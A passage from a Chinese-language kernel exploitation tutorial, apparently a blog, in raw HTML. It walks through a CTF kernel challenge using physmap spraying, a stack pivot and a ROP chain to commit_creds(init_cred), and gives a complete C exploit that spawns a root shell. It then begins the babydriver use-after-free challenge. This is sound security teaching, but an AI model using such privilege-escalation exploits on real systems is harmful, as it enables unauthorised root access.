class="hljs-string">&quot;$1\n$2&quot;</span> <span class="hljs-string">&quot;\n$2=&quot;</span> &lt; <span class="hljs-string">&quot;$img&quot;</span> | grep -abo <span class="hljs-string">&quot;^$2&quot;</span>`<br>    do<br>        pos=$&#123;pos%%:*&#125;<br>        tail -c+$pos <span class="hljs-string">&quot;$img&quot;</span> | $<span class="hljs-number">3</span> &gt; $tmp <span class="hljs-number">2</span>&gt; /dev/null<br>        check_vmlinux $tmp<br>    done<br>&#125;<br><br><span class="hljs-comment"># Check invocation:</span><br>me=$&#123;<span class="hljs-number">0</span><span class="hljs-comment">##*/&#125;</span><br>img=$<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>  [ $<span class="hljs-comment"># -ne 1 -o ! -s &quot;$img&quot; ]</span><br>then<br>    echo <span class="hljs-string">&quot;Usage: $me &lt;kernel-image&gt;&quot;</span> &gt;&amp;<span class="hljs-number">2</span><br>    exit <span class="hljs-number">2</span><br>fi<br><br><span class="hljs-comment"># Prepare temp files:</span><br>tmp=$(mktemp /tmp/vmlinux-XXX)<br>trap <span class="hljs-string">&quot;rm -f $tmp&quot;</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># That didn&#x27;t work, so retry after decompression.</span><br>try_decompress <span class="hljs-string">&#x27;\037\213\010&#x27;</span> xy    gunzip<br>try_decompress <span class="hljs-string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz<br>try_decompress <span class="hljs-string">&#x27;BZh&#x27;</span>          xy    bunzip2<br>try_decompress <span class="hljs-string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma<br>try_decompress <span class="hljs-string">&#x27;\211\114\132&#x27;</span> xy    <span class="hljs-string">&#x27;lzop -d&#x27;</span><br>try_decompress <span class="hljs-string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="hljs-string">&#x27;lz4 -d&#x27;</span><br>try_decompress <span class="hljs-string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd<br><br><span class="hljs-comment"># Finally check for uncompressed images or objects:</span><br>check_vmlinux $img<br><br><span class="hljs-comment"># Bail out:</span><br>echo <span class="hljs-string">&quot;$me: Cannot find vmlinux.&quot;</span> &gt;&amp;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>另外一种方法就是使用比较完善的<code>vmlinux-to-elf</code>，具体github地址如下：</p><blockquote><p><a href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a></p></blockquote><p>下)面我们获取两个函数的地址：</p><pre><code class="hljs">ffffffff810c92e0 &lt;commit_creds&gt;:ffffffff810c9540 &lt;prepare_kernel_cred&gt;:</code></pre><p>大家应该还记得咱们提权的方法吧，那就是想办法执行<code>commit_creds(prepare_kernel_cred(NULL))</code>,将内核权限赋予新进程</p><p>回顾我们上面的利用手法，我们需要再用户程序申请大量的内存来增加我们再内核态找到对应物理内存的几率，因此我们再C用户程序种使用<code>mmap</code>函数来进行匿名内存映射：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">map_spray</span>[<span class="hljs-number">0</span>] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>现在我们还需要找到一些gadget来进行我们的利用</p><p>如同之前内核ROP，我们同样需要找到<code>swapgs</code>、<code>iretq</code>等语句,但是本题的启动脚本我们可以发现开启了kpti，这导致我们在构造返回用户态的时候需要修改cr3寄存器，也就是改一下我们的页表地址，因此我们可以利用下面我们获得到的一个内核函数，该函数就包括了咱们<code>swapgs;ireq;</code>这样的指令，但是这里注意，整个函数可以用下面的形式来表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">swapgs;<br>pop;<br>pop;<br>iretq;<br></code></pre></td></tr></table></figure><p>所以说我们构造ROP链的时候需要加两个padding：）</p><p><code>swapgs_restoer_regs_and_return_to_usermode</code>,如下：</p><pre><code class="hljs">.text:FFFFFFFF81C00FB0                               public swapgs_restore_regs_and_return_to_usermode.text:FFFFFFFF81C00FB0                               swapgs_restore_regs_and_return_to_usermode proc near.text:FFFFFFFF81C00FB0                                                                       ; CODE XREF: ret_from_fork+15↑j.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+54↑j.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+65↑j.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+74↑j.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+87↑j.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+94↑j.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+A3↑j.text:FFFFFFFF81C00FB0                                                                       ; error_return+E↓j.text:FFFFFFFF81C00FB0                                                                       ; asm_exc_nmi+93↓j.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSENTER_compat_after_hwframe+4F↓j.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_compat_after_hwframe+47↓j.text:FFFFFFFF81C00FB0                                                                       ; entry_INT80_compat+85↓j.text:FFFFFFFF81C00FB0                                                                       ; DATA XREF: print_graph_irq+D↑o.text:FFFFFFFF81C00FB0                                                                       ; print_graph_entry+59↑o.text:FFFFFFFF81C00FB0 90                            nop                                     ; Alternative name is &#39;__irqentry_text_end&#39;.text:FFFFFFFF81C00FB1 90                            nop.text:FFFFFFFF81C00FB2 90                            nop.text:FFFFFFFF81C00FB3 90                            nop.text:FFFFFFFF81C00FB4 90                            nop.text:FFFFFFFF81C00FB5 41 5F                         pop     r15.text:FFFFFFFF81C00FB7 41 5E                         pop     r14.text:FFFFFFFF81C00FB9 41 5D                         pop     r13.text:FFFFFFFF81C00FBB 41 5C                         pop     r12.text:FFFFFFFF81C00FBD 5D                            pop     rbp.text:FFFFFFFF81C00FBE 5B                            pop     rbx.text:FFFFFFFF81C00FBF 41 5B                         pop     r11.text:FFFFFFFF81C00FC1 41 5A                         pop     r10.text:FFFFFFFF81C00FC3 41 59                         pop     r9.text:FFFFFFFF81C00FC5 41 58                         pop     r8.text:FFFFFFFF81C00FC7 58                            pop     rax.text:FFFFFFFF81C00FC8 59                            pop     rcx.text:FFFFFFFF81C00FC9 5A                            pop     rdx.text:FFFFFFFF81C00FCA 5E                            pop     rsi                             ;直到这里可以发现咱们是在主动恢复一些当时中断保存的pt_regs寄存器组.text:FFFFFFFF81C00FCB 48 89 E7                      mov     rdi, rsp                        ;我们可以跳过这些寄存器直接开整.text:FFFFFFFF81C00FCE 65 48 8B 24 25 04 60 00 00    mov     rsp, gs:qword_6004.text:FFFFFFFF81C00FD7 FF 77 30                      push    qword ptr [rdi+30h].text:FFFFFFFF81C00FDA FF 77 28                      push    qword ptr [rdi+28h].text:FFFFFFFF81C00FDD FF 77 20                      push    qword ptr [rdi+20h].text:FFFFFFFF81C00FE0 FF 77 18                      push    qword ptr [rdi+18h].text:FFFFFFFF81C00FE3 FF 77 10                      push    qword ptr [rdi+10h].text:FFFFFFFF81C00FE6 FF 37                         push    qword ptr [rdi].text:FFFFFFFF81C00FE8 50                            push    rax.text:FFFFFFFF81C00FE9 EB 43                         jmp     short loc_FFFFFFFF81C0102E............text:FFFFFFFF81C0102E                               loc_FFFFFFFF81C0102E:                   ; CODE XREF: swapgs_restore_regs_and_return_to_usermode+39↑j.text:FFFFFFFF81C0102E 58                            pop     rax                             ;这里pop了两个值，所以需要在ROP种填充.text:FFFFFFFF81C0102F 5F                            pop     rdi.text:FFFFFFFF81C01030 0F 01 F8                      swapgs.text:FFFFFFFF81C01033 FF 25 47 8D E4 00             jmp     cs:off_FFFFFFFF82A49D80</code></pre><p>从这个名字也可以看出他是为了在中断例程结束后，从内核态返回用户态时所调用的函数，他首先会pop大量的寄存器来还原当时的环境，这里我们并不需要，所以我们需要的开始执行的地址就从<code>0xFFFFFFFF81C00FCB</code>进行咱们的利用，从这力同样可以返回用户态，因此这就是我们所需要的。</p><p>这里还有一点就是该<code>vmlinux</code>中并没有发现<code>mov rdi rax;</code>的指令，因此我们实现<code>commit_creds(prepare_kernel_cred(NULL))</code>有点困难，因此我们要利用到一个小知识点，那就是内核运行过程中会存在一个结构体<code>init_cred</code>,他表示root权限的结构体，因此我们改为实现<code>commit_creds(init_cred)</code>,找到结果如下：</p><pre><code class="hljs">ffffffff810c9640:       f0 ff 05 b9 20 9a 01    lock inc DWORD PTR [rip+0x19a20b9]        # ffffffff82a6b700 &lt;init_cred&gt;</code></pre><h2 id="4-利用步骤"><a href="#4-利用步骤" class="headerlink" title="4.利用步骤"></a>4.利用步骤</h2><p>一些基本的gadget找到后我们如何让程序运行呢，这里我们来梳理一下本题中的关键点：</p><ul><li><code>ioctl</code>系统调用会执行我们传入的函数指针，但是这里只能传递内核的函数指针，由于开启了SMAP&#x2F;SMEP所以会有访问控制</li><li>我们大量使用<code>mmap</code>映射了大片用户内存到物理内存上，并且以页为单位构造相同的ROP链，因此此时我们只需要传递<code>direct mapping</code>中的某一个内核地址，如果我们<code>mmap</code>分配的内存达到了一定量级理论上我们随机挑一个内存直接映射区地址，大概率会跳转到我们用户态构建的ROP链上</li><li>最后就是我们ROP的基础，让我们的链位于栈上，我们所构造的ROP链目前是改不了了，但我们可以利用栈迁移的知识，通过栈迁移跳转到目标ROP上进行稳定提权</li></ul><h2 id="5-栈迁移以及偏移计算"><a href="#5-栈迁移以及偏移计算" class="headerlink" title="5.栈迁移以及偏移计算"></a>5.栈迁移以及偏移计算</h2><p>总结过后我们目前最后的点那就是进行栈迁移，但是如何进行栈迁移呢<br>经过我们之前的分析我们知道，在调用ioctl后，函数首先会对于其中的某些寄存器进行赋值操作，此时能够被咱们使用的是r8,r9了（不过这里暂时不太清楚，难道说是因为前面的寄存器都需要参与<code>ioctl</code>接下来的函数操作，而其他的寄存器由不尽数相连，无法构成迁移ROP？）<br>总之我们到r8、r9寄存器中填充我们的ROP链，也就是利用如下指令</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsp</span><span class="hljs-comment">; ret</span><br></code></pre></td></tr></table></figure><p>我们通过在r9中填入指令，然后到r8当中填入我们所猜测的地址，这样就将栈迁移到了我们所构造的mmap映射到的物理内存了，然后就进行ROP<br>这里同样找到该指令的地址</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xffffffff811483d0</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsp</span> <span class="hljs-comment">; ret</span><br></code></pre></td></tr></table></figure><p>但是我们该如何执行到这里的指令呢，这里我们知道当我们进入内核态的时候，栈同时也会转移，并且内核态的栈会保存咱们用户态时寄存器的一些值，所以我们此时只需要将栈顶地址加上到达保存r9寄存器值得地址偏移就可以使得我们执行当时的指令了，这个具体偏移我们调试内核进行查找。<br>接下来我们先来查找一下kgadget的偏移，具体步骤在我之前的文章有讲解，也就是重新打包一下文件系统以及init脚本即可，链接如下：<br><a href="https://www.52pojie.cn/thread-1706316-1-1.html">Linux内核PWN环境准备</a></p><p>然后我们开始调试内核查看偏移：<br>首先我们先利用ioctl系统调用执行我们猜测的地址，这里我们填入的是一个<code>add rsp val; ret</code>类型的指令，目的就是让该指令能ret到r9，而r9中存放的是咱们的<code>pop rsp; ret</code>指令，从而实现栈迁移，这里我们先到伪造的内存页的第一条指令打上断点：<br><img src="http://imgsrc.baidu.com/forum/pic/item/024f78f0f736afc3fefa26acf619ebc4b6451200.jpg"></p><p>这里其实我填上的已经是找好的地址辣，但是目前我们假装不知道来寻找偏移，此时我们知道内核栈上应该存在6个<code>attrnba</code>的值，然后相隔1个又是他，这是attrnba师傅在写题的时候给的一个记号，如下：<br><img src="http://imgsrc.baidu.com/forum/pic/item/cefc1e178a82b901d843dafa368da9773812ef09.jpg"><br>因此我们在此刻查找对应栈看是否有这样的布局，我们浅看一下发现果然如此！<br><img src="http://imgsrc.baidu.com/forum/pic/item/4e4a20a4462309f75b85b4db370e0cf3d6cad615.jpg"><br>这里恰好跟我们预想的一致，而可以推算出r9寄存器值得地址保存在<code>0xffffc900001a7f98</code>，其实从旁边提示也知道是在这儿，而且底下得r8也确实是咱们猜测的地址，这里我们计算偏移也就是简单的减法：<code>0xffffc900001a7f98 - 0xffffc900001a7ed8 = 0xc0</code><br>可知我们需要找到的ROP的第一条语句应该是<code>add rsp, 0xc0</code>,可是一切并不如我们所料，在遍历vmlinux中并没发现这样的语句，但是我们找到了他的一个替代<br><code>add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret</code>,<br>这条指令也确实可以达成将栈增加0xc0的效果，然后之后就是正常的进行我们的rop链，这里我们构造ROP链是采取以下的方法<br><img src="http://imgsrc.baidu.com/forum/pic/item/d4628535e5dde71187d95b3fe2efce1b9c1661eb.jpg"><br>最底下的ROP链也是咱们构造的执行相应函数提权的链条然后返回用户态。</p><h2 id="6-终极测试！"><a href="#6-终极测试！" class="headerlink" title="6.终极测试！"></a>6.终极测试！</h2><p>上面的步骤讲解完毕，我们就使用qemu进行测试<br><img src="http://imgsrc.baidu.com/forum/pic/item/a6efce1b9d16fdfab213de27f18f8c5495ee7bff.jpg"></p><p>可以发现我们猜测的physmap中的任意地址，大概率都可以完成提权操作</p><p>下面是exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810c92e0</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff810c9540</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> swapgs_pop2_retuser = <span class="hljs-number">0xFFFFFFFF81C00FB0</span> + <span class="hljs-number">0x1B</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> add_rsp = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ret = <span class="hljs-number">0xffffffff810001fc</span>;<br><span class="hljs-type">long</span> page_size;     <span class="hljs-comment">//一页大小</span><br><span class="hljs-type">int</span> dev;<br><span class="hljs-type">size_t</span>* map_spray[<span class="hljs-number">16000</span>];<br><span class="hljs-type">size_t</span> guess;   <br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">getShell</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">makeROP</span><span class="hljs-params">(<span class="hljs-type">size_t</span>*)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br>​<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>​          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>​          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>​          <span class="hljs-string">&quot;pushf;&quot;</span><br>​          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>​        );<br>​  info_log(<span class="hljs-string">&quot;Status has been saved.&quot;</span>);<br>​&#125;<br>​<br><span class="hljs-type">void</span> <span class="hljs-title function_">getShell</span><span class="hljs-params">()</span>&#123;<br>info_log(<span class="hljs-string">&quot;Ready to get root........&quot;</span>);<br><span class="hljs-keyword">if</span>(getuid())&#123;<br>    error_log(<span class="hljs-string">&quot;Failed to get root!&quot;</span>);<br>  &#125;<br>  info_log(<span class="hljs-string">&quot;Root got!&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">makeROP</span><span class="hljs-params">(<span class="hljs-type">size_t</span>* space)</span>&#123;<br>  <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(; index &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x30</span>); index++)<br>    space[index] = add_rsp;<br>  <span class="hljs-keyword">for</span>(; index &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); index++)<br>    space[index] = ret;<br>     space[index++] = pop_rdi_ret;<br>  space[index++] = init_cred;<br>  space[index++] = commit_creds;<br>  space[index++] = swapgs_pop2_retuser;<br>  space[index++] = <span class="hljs-number">0xDeadBeef</span>;<br>  space[index++] = <span class="hljs-number">0xdEADbEAF</span>;<br>  space[index++] = (<span class="hljs-type">size_t</span>)getShell;<br>  space[index++] = user_cs;<br>  space[index++] = user_rflags;<br>  space[index++] = user_sp;<br>  space[index++] = user_ss;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  save_status();<br>  dev = open(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>, O_RDWR);<br>  <span class="hljs-keyword">if</span>(dev &lt; <span class="hljs-number">0</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;Cannot open device \&quot;/dev/kgadget\&quot;!&quot;</span>);<br>  &#125;<br>  page_size = sysconf(_SC_PAGESIZE);    <br>  info_log(<span class="hljs-string">&quot;Spraying physmap...&quot;</span>);<br><br>  map_spray[<span class="hljs-number">0</span>] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  makeROP(map_spray[<span class="hljs-number">0</span>]); <br>  info_log(<span class="hljs-string">&quot;make done!&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i&lt;<span class="hljs-number">15000</span>; i++)&#123;<br>    map_spray[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!map_spray[i])&#123;<br>      error_log(<span class="hljs-string">&quot;Mmap Failed!&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(map_spray[i], map_spray[<span class="hljs-number">0</span>], page_size);<br>  &#125;<br>  guess = <span class="hljs-number">0xFFFF888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>  info_log(<span class="hljs-string">&quot;Ready to ture to kernel.....&quot;</span>);<br>  __asm__(<span class="hljs-string">&quot;mov r15, 0xdeadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r14, 0xceadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r13, 0xbeadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r12, 0xaeadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r11, 0xdeadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r10, 0x123456;&quot;</span><br>          <span class="hljs-string">&quot;mov rbp, 0x1234567;&quot;</span><br>          <span class="hljs-string">&quot;mov rbx, 0x87654321;&quot;</span><br>          <span class="hljs-string">&quot;mov r9, pop_rsp_ret;&quot;</span><br>          <span class="hljs-string">&quot;mov r8, guess;&quot;</span><br>          <span class="hljs-string">&quot;mov rax, 0x10;&quot;</span><br>          <span class="hljs-string">&quot;mov rcx, 0x12344565;&quot;</span><br>          <span class="hljs-string">&quot;mov rdx, guess;&quot;</span><br>          <span class="hljs-string">&quot;mov rsi, 0x1bf52;&quot;</span><br>          <span class="hljs-string">&quot;mov rdi, dev;&quot;</span><br>          <span class="hljs-string">&quot;syscall;&quot;</span><br>        );<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="三、Kernel-Heap-UAF"><a href="#三、Kernel-Heap-UAF" class="headerlink" title="三、Kernel Heap - UAF"></a>三、Kernel Heap - UAF</h1><h2 id="例题：CISCN-2017-babydriver"><a href="#例题：CISCN-2017-babydriver" class="headerlink" title="例题：CISCN - 2017 - babydriver"></a>例题：CISCN - 2017 - babydriver</h2><p>典中典题,大伙珍惜,从中可以学到很多结构体的认识</p><h3 id="1-题目逆向"><a href="#1-题目逆向" class="headerlink" title="1.题目逆向"></a>1.题目逆向</h3><p>首先就是检查一些脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span>                                                                                          <br>qemu-system-x86_64 -initrd core.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic <br>    panic=1&#x27; -enable-kvm -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep <br>    -s<br><br></code></pre></td></tr></table></figure><ol><li>单核单线程</li><li>开启smep(执行禁止)</li><li>在kvm64 和 +smep的情况下会自动开启KPTI</li></ol><p>以及文件系统的启动脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>chown root:root flag<br>chmod 400 flag<br>exec 0&lt;/dev/console<br>exec 1&gt;/dev/console<br>exec 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br>chmod 777 /dev/babydev<br>echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;<br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br><br></code></pre></td></tr></table></figure><p>可以看到加载了一个<code>babydriver.ko</code>模块,大致就是需要逆这里<br>因此我们例行checksec一下</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/KernelLearning/babydriver$ [*] &#39;/home/dawn/KernelLearning/babydriver/extract/lib/modules/4.4.72/babydriver.ko&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x0)</code></pre><p>然后就开始我们的逆向过程,如下:</p><p>babydriver_init没必要看,大致意思就是注册了一个<code>/dev/babydev</code>的设备,下面看fops</p><pre><code class="hljs">.data:00000000000008C0                               ; ===========================================================================.data:00000000000008C0.data:00000000000008C0                               ; Segment type: Pure data.data:00000000000008C0                               ; Segment permissions: Read/Write.data:00000000000008C0                               _data segment align_32 public &#39;DATA&#39; use64.data:00000000000008C0                               assume cs:_data.data:00000000000008C0                               ;org 8C0h.data:00000000000008C0                               public fops.data:00000000000008C0                               ; file_operations fops.data:00000000000008C0 C0 09 00 00 00 00 00 00 00 00+fops file_operations &lt;offset __this_module, 0, offset babyread, offset babywrite, 0, 0, 0, 0, \.data:00000000000008C0 00 00 00 00 00 00 30 01 00 00+                                        ; DATA XREF: babydriver_init:loc_1AA↑o.data:00000000000008C0 00 00 00 00 F0 00 00 00 00 00+                 offset babyioctl, 0, 0, offset babyopen, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \.data:00000000000008C0 00 00 00 00 00 00 00 00 00 00+                 0&gt;.data:00000000000008C0 00 00 00 00 00 00 00 00 00 00+_data ends.data:00000000000008C0 00 00 00 00 00 00 00 00 00 00+</code></pre><p>这里也就是该设备的一个<code>file_operations</code>,实现了read,ioctl,open,write等函数,因此我们首先看open</p><pre><code class="hljs">int __fastcall babyopen(inode *inode, file *filp)&#123;  __int64 v2; // rdx  _fentry__(inode, filp);  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL);  babydev_struct.device_buf_len = 64LL;  printk(&quot;device open\n&quot;, 0x24000C0LL, v2);  return 0;&#125;</code></pre><p>可以看到我们open的时候,他首先调用<code>kmem_cache_alloc_trace</code>函数分配了内核空间给全局变量<code>babydev_struct</code>的字段,然后赋值其中长度字段为64,然后我们来看ioctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 